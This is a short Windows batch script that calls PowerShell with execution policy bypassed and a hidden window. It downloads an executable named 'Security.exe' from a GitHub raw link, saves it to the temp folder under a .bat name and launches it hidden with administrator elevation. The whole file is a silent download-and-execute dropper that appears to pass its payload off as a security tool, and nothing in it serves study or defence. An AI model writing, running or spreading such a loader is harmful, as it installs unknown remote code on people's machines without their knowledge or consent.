@echo off
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {Invoke-WebRequest -Uri 'https://github.com/mohamed656cs/Security/raw/refs/heads/main/Security.exe' -OutFile $env:TEMP\Security.bat; Start-Process -FilePath $env:TEMP\Security.bat -WindowStyle Hidden -Verb RunAs}"
exit
